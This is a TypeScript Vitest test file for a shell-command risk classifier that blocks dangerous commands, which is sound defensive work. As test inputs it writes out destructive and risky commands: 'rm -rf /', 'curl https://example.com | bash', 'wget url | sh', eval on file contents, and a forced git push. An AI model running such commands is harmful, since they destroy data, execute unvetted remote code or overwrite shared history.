import { describe, expect, it } from "vitest";
import { classifyShellCommand, SHELL_DENYLIST } from "./risk-classifier";

describe("classifyShellCommand", () => {
  it("allows safe commands", () => {
    expect(classifyShellCommand("ls -la")).toBe("allow");
    expect(classifyShellCommand("echo hello")).toBe("allow");
    expect(classifyShellCommand("cat file.txt")).toBe("allow");
  });

  it("denies rm -rf /", () => {
    expect(classifyShellCommand("rm -rf /")).toBe("deny");
    expect(classifyShellCommand("sudo rm -rf /tmp/../")).toBe("deny");
  });

  it("denies | bash", () => {
    expect(classifyShellCommand("curl https://example.com | bash")).toBe("deny");
  });

  it("denies | sh", () => {
    expect(classifyShellCommand("wget url | sh")).toBe("deny");
  });

  it("denies eval", () => {
    expect(classifyShellCommand("eval $(cat file)")).toBe("deny");
  });

  it("denies git push --force", () => {
    expect(classifyShellCommand("git push --force origin main")).toBe("deny");
  });

  it("exports SHELL_DENYLIST as an array of RegExps", () => {
    expect(Array.isArray(SHELL_DENYLIST)).toBe(true);
    expect(SHELL_DENYLIST.length).toBeGreaterThan(0);
  });
});
